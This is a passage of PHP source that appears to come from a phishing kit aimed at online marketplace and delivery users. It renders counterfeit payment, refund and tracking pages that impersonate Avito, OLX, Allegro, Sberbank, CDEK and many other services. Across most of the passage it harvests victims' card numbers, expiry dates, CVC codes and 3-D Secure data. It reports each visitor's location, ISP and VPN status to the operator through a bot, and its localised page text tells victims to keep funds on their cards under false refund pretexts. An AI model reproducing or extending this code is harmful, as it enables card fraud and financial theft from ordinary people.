'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$ttx = [
				'поръчка',
				'сигурна сделка',
				'получаване на средства',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			$hash0 = md5($isnb.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				//setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, true);
			if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$valute = 'KZT';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$valute = 'BYN';
			} 
if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $valute = 'RUB';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$valute = 'RON';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$valute = 'BGN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$valute = 'UAH';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$valute = 'UZS';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$valute = 'PLN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$valute = 'CZK';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$valute = 'USD';
			} 
				$ddos0 = true;
				botSend([
					'🍾 <b>Переход на '.$ttx.'</b>',
					'',
					'📱 ID объявления: <b>'.$item.'</b>',
					'🧾 Название: <b>'.$title.'</b>',
					'🥇 Стоимость: <b>'.beaCash($amount).''.$valute.'</b>',
					'🛒 Сервис: <b>'.getService($srvc, false, $isnb == 2).'</b>',
					'🌍 Домен: <b>'.$domain.'</b>',
					'',
				//	'🕶 IP: <b>'.$ip.'</b>',
					'🔍 Локация: <b>'.$iploc.'</b>',
					'🕍 Провайдер: <b>'.$ipprov.'</b>',
					'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%img%',
				'%city%',
				'%namef%',
				'%phone%',
				'%address%',
				'%cars_city1%',
				'%cars_city2%',
				'%cars_date1%',
				'%cars_date2%',
				'%cars_time1%',
				'%cars_time2%',
				'%cars_amount%',
				'%cars_adress1%',
				'%cars_adress2%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-'.($isnb + 1))),
				$item,
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, ($isnb == 2 ? 5 : 0)),
				$itemd[7],
				$itemd[8],
				$itemd[9],
				beaPhone($itemd[10]),
				$itemd[11],
				$itemd[13], //cars_city1
				$itemd[7], //cars_city2
				$itemd[9],  //cars_date1
				$itemd[11], //cars_date2
				$itemd[10],  //cars_date1
				$itemd[12], //cars_date2
				$itemd[5],  //cars_amount
				$itemd[6],  //cars_adress1
				$itemd[8],  //cars_adress2
			], fileRead(dirPages($srvc.'-'.($isnb + 1))));
			break;
		}
		case 'track': {
			$tst = intval($itemd[16]);
			if ($tst == 0)
				$tst = 1;
			$hash0 = md5($tst.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
			//	setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, false);
				if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$valute = 'KZT';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$valute = 'BYN';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {			
                $valute = 'RUB';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$valute = 'RON';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$valute = 'BGN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$valute = 'UAH';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$valute = 'UAH';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$valute = 'PLN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$valute = 'PLN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$valute = 'USD';
			} 
				$ddos0 = true;
				botSend([
					'🍾 <b>Переход на отслеживание</b>',
					'',
					'⛴ Трек номер: <b>'.$item.'</b>',
					'🧾 Название: <b>'.$title.'</b>',
					'🥇 Стоимость: <b>'.beaCash($amount).''.$valute.'</b>',
					'🚹 Статус: <b>'.trackStatus($tst).'</b>',
					'🛒 Сервис: <b>'.getService($srvc).'</b>',
					'🌍 Домен: <b>'.$domain.'</b>',
					'',
				//	'🌎 IP: <b>'.$ip.'</b>',
					'🔍 Локация: <b>'.$iploc.'</b>',
					'🕍 Провайдер: <b>'.$ipprov.'</b>',
					'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%cityf%',
				'%cityt%',
				'%namef%',
				'%namet%',
				'%size%',
				'%address%',
				'%phone%',
				'%timef%',
				'%timet%',
				//'%index%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-1')),
				'CB'.$item.'0RU',
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, $tst == 4 ? 4 : ($tst == 1 ? 0 : 2)),
				$itemd[7],
				$itemd[11],
				$itemd[9],
				$itemd[10],
				beaKg($itemd[8]),
				$itemd[12],
				beaPhone($itemd[13]),
				$itemd[14],
				$itemd[15],
				//explode(', ', $itemd[12], 2)[0],
			], fileRead(dirPages($srvc.'-'.$tst)));
			break;
		}
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			$xcaptchadata = $_POST2;
			$pmnt = paymentName();
			addItemData($item, 0, 1, true);
			$isrpar = ($action == 'ayeruchnayaplatejjjka666');
			$isrpac = (strlen($pmnt) == 0 || (isAutoPayment() && $amount >= activateRuchka()));
			if (!$isrpac) {
				require 'pay.libs/Crypt/RSA.php';
				require 'pay.libs/Math/BigInteger.php';
				include '_payment_'.$pmnt.'.php';
			}
			$isnr = array_search($action, ['merchant', 'refund', 'unlock']);

					if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
					$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
					$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {			
            	$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
					$ttx = [
				[
					'plata comenzii',
					'A plăti',
					'A plati',
					'Plata pentru comandă',
					'',
				],
				[
					'restituire',
					'A se intoarce',
					'Obține',
					'Restituire',
					'Pentru a face o rambursare, trebuie să rezervăm fonduri pe cardul dvs. în cuantumul sumei tranzacției.',
				],
				[
					'primirea de fonduri',
					'A primi',
					'Obține',
					'Primirea de fonduri',
					'Pentru a primi bani pentru un produs plătit, soldul cardului dvs. trebuie să fie cel puțin suma tranzacției.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
					$ttx = [
				[
					'плащане поръчка',
					'За плащане',
					'Плати',
					'Плащане на поръчка',
					'',
				],
				[
					'възстановяване на средства',
					'За връщане',
					'Вземи',
					'Възстановяване на средства',
					'За да извършим възстановяване, трябва да резервираме на вашата карта парични средства в размер на сумата на сделката.',
				],
				[
					'получаване на средства',
					'За получаване',
					'Вземи',
					'Получаване на средства',
					'За да получите пари за платена стока, салдото по картата трябва да бъде не по-малко от сумата на сделката.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$ttx = [
				[
					'оплаты заказа',
					'Płacić',
					'Zapłacić',
					'Rejestracja i płatność',
					'',
				],
				[
					'возврата средств',
					'Wracać',
					'Otrzymać',
					'Zwroty kosztów',
					'Aby dokonać zwrotu, musimy zarezerwować na Twojej karcie pieniądze w wysokości kwoty transakcji.',
				],
				[
					'получения средств',
					'Otrzymać',
					'Otrzymać',
					'Otrzymywanie środków',
					'Aby otrzymać pieniądze za płatny produkt, saldo karty musi wynosić co najmniej kwotę transakcji.',
				],
			][$isnr];
			} 
	    	if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$ttx = [
				[
					'оплаты заказа',
					'A plati',
					'A plati',
					'Înregistrare și plată',
					'',
				],
				[
					'возврата средств',
					'Wracać',
					'Otrzymać',
					'Zwroty kosztów',
					'Aby dokonać zwrotu, musimy zarezerwować na Twojej karcie pieniądze w wysokości kwoty transakcji.',
				],
				[
					'получения средств',
					'Dosáhnout',
					'Dosáhnout',
					'Příjem finančních prostředků',
					'Abyste mohli dostávat peníze za placený produkt, musí zůstatek na vaší kartě činit alespoň částku transakce.',
				],
			][$isnr];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
					$ttx = [
				[
					'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Оплата заказа',
					'',
				],
				[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				],
				[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
				],
			][$isnr];
			} 
		if($iscars == 'true')
			{
			    $ttx = [
			        [
			        'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Бронирование',
					],
					[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				    ],
			    	[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
			    	],
			    	][$isnr];
			}
			$cost = 0;
			if ($isnt) {
				$cost = $_POST2['fcost'];
				if (strlen($cost) != 0) {
					$cost = intval($cost);
				//	setIpData($ip, 'dlvr', $cost);
					setCookieData('dlvr'.$item, $cost, $_COOKIE2);
				} else {
				//	$cost = intval(getIpData($ip, 'dlvr'));
					$cost = intval(getCookieData('dlvr'.$item, $_COOKIE2));
				}
				$cost = min(max($cost, 0), 10000);
				if ($cost > 0)
					$amount += $cost;
			}
			$shop = getShopName($srvc, $isnr);
			$redir = getFakeRedir($domain, $item, $isnr);
			$errmsg = false;
			$card = beaText($_POST2['fcard'], chsNum());
			$expm = $_POST2['fexpm'];
			$expy = $_POST2['fexpy'];
			$cvc = $_POST2['fcvc'];
			$balancecard = intval($_POST2['balancecard']);
			$ffdalle = $_POST2['ffdalle'];
			$pares = $_POST2['PaRes'];
			$merchant = $_POST2['MD'];
			if (getService($srvc) == 'OLX KZ' or getService($srvc) == 'OLX KZ 2.0' or getService($srvc) == 'КазПочта' or getService($srvc) == 'КазПочта 2.0' or getService($srvc) == 'OLX KZ недвижимость' or getService($srvc) == 'OLX KZ недвижимость 2.0') {
				$valute = 'KZT';
			} 
			if (getService($srvc) == 'Куфар' or getService($srvc) == 'Куфар 2.0' or getService($srvc) == 'BelPost' or getService($srvc) == 'BelPost 2.0' or getService($srvc) == 'Европочта' or getService($srvc) == 'Европочта 2.0') {
				$valute = 'BYN';
			} 
			if (getService($srvc) == 'OLX RO' or getService($srvc) == 'OLX RO 2.0' or getService($srvc) == 'FAN Courier' or getService($srvc) == 'FAN Courier 2.0') {
				$valute = 'RON';
			} 
			if (getService($srvc) == 'OLX UA' or getService($srvc) == 'OLX UA 2.0' or getService($srvc) == 'IZI ua' or getService($srvc) == 'IZI ua 2.0') {
				$valute = 'UAH';
			} 
			if (getService($srvc) == 'OLX UZ' or getService($srvc) == 'OLX UZ 2.0' or getService($srvc) == 'Fargo uz' or getService($srvc) == 'Fargo uz 2.0') {
				$valute = 'UZS';
			} 
			if (getService($srvc) == 'OLX PL' or getService($srvc) == 'OLX PL 2.0' or getService($srvc) == 'Allegro' or getService($srvc) == 'Allegro 2.0') {
				$valute = 'PLN';
			} 
			if (getService($srvc) == 'СБАЗАР' or getService($srvc) == 'СБАЗАР 2.0') {
				$valute = 'CZK';
			} 
			if (getService($srvc) == 'Gumtree' or getService($srvc) == 'Gumtree 2.0') {
				$valute = 'USD';
			} 
			if (getService($srvc) == 'OLX BG' or getService($srvc) == 'OLX BG 2.0') {
				$valute = 'BGN';
			} 
			if (getService($srvc) == 'Юла' or getService($srvc) == 'Юла 2.0' or getService($srvc) == 'Авито' or getService($srvc) == 'Авито 2.0' or getService($srvc) == 'СДЭК' or getService($srvc) == 'СДЭК 2.0' or getService($srvc) == 'ПЭК' or getService($srvc) == 'ПЭК 2.0' or getService($srvc) == 'Боксберри' or getService($srvc) == 'Боксберри 2.0' or getService($srvc) == 'Яндекс' or getService($srvc) == 'Яндекс 2.0' or getService($srvc) == 'Достависта' or getService($srvc) == 'Достависта 2.0' or getService($srvc) == 'Avito Недвижимость' or getService($srvc) == 'Avito Недвижимость 2.0' or getService($srvc) == 'Youla Недвижимость' or getService($srvc) == 'Youla Недвижимость 2.0' or getService($srvc) == 'Почта РФ' or getService($srvc) == 'Почта РФ 2.0' or getService($srvc) == 'Сбербанк' or getService($srvc) == 'Сбербанк 2.0' or getService($srvc) == 'Альфа-Банк' or getService($srvc) == 'Альфа-Банк 2.0' or getService($srvc) == 'AUTO RU' or getService($srvc) == 'AUTO RU 2.0' or getService($srvc) == 'DROM' or getService($srvc) == 'DROM 2.0' or getService($srvc) == 'Booking' or getService($srvc) == 'Booking 2.0' or getService($srvc) == 'Яндекс Объявления' or getService($srvc) == 'Яндекс Объявления 2.0' or getService($srvc) == 'БлаБлаКар' or getService($srvc) == 'БлаБлаКар 